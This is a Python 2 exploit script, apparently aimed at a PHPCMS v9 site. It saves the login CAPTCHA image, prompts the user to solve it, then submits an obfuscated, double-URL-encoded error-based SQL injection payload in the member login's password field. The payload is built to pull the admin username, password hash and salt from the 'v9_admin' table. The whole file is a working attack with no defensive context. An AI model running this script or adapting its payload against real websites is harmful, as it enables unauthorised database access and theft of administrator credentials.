#!/usr/bin/env python

import sys
import os
import requests
import json
import time

def sql_injection_test(url,cookie,code):
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox',}
    cookies = {'PHPSESSID':cookie}
    #payload 
    payload = "1111111%26username%3d%2527%2bunion%2bselect%2b%25272999999%2527%252c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252c0x272C2873656C656374202831292066726F6D206D7973716C2E7573657220776865726520313D3120614E64202853454C45435420312046524F4D202873656C65637420636F756E74282A292C636F6E63617428666C6F6F722872616E642830292A32292C28737562737472696E67282853656C656374202873656C65637420636F6E63617428757365726E616D652C307833612C70617373776F72642C307833612C656E6372797074292066726F6D2076395F61646D696E206C696D697420302C3129292C312C3632292929612066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C65732067726F75702062792061296229292C27%252c111%252c222%252c0x33333333272923%252c444%252c555%252c666%252cnull%2523"
    print payload
    data = {
    'forword': '',
    'username': 'admin',
    'password': payload,
    'code':code,
    'dosubmit':"%E7%99%BB%E5%BD%95",
    }
    api_url=url+"/index.php?m=member&c=index&a=logi"
    try:
    	req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
    	print req.content
    except Exception,e:
    	print e
        sys.exit(1)


def get_cookie(url):
    api_url = url+'/?m=admin&c=index&a=login'
    try:
        req = requests.get(api_url,timeout=3)
        #print req.content
        req_status = req.status_code     
    except Exception,e:
    	print e
        sys.exit(1)
    if req_status == 200:
    	cookie = req.cookies['PHPSESSID']
        print "get cookie:%s" % cookie
        return cookie



def downloadcode(url):
    pic_file = int(time.time())
    pic_url = url+"/api.php?op=checkcode&code_len=4&font_size=14&width=84&height=24&font_color=&background=&0.40671250"
    print '[+] Download Code Img: {}'.format(pic_url)
    try:
        resp = requests.get(pic_url, verify=False, timeout=5)
        req_status = resp.status_code  
    except Exception,e:
        print e
        sys.exit(1)
    if req_status == 200:
    	cookie = resp.cookies['PHPSESSID']
        print "get cookie:%s" % cookie

    with open("./%s.png"%pic_file, 'wb') as fp:
        fp.write(resp.content)
        print "file name:%s" % pic_file+'.png'
    return cookie

if __name__ == '__main__':
	if len(sys.argv) == 1:
		print "useage:%s url" % sys.argv[0]
		sys.exit(1)
	url = sys.argv[1]
	cookie = downloadcode(url)
	code = raw_input("please check the img code and input: ")
	sql_injection_test(url,cookie,code)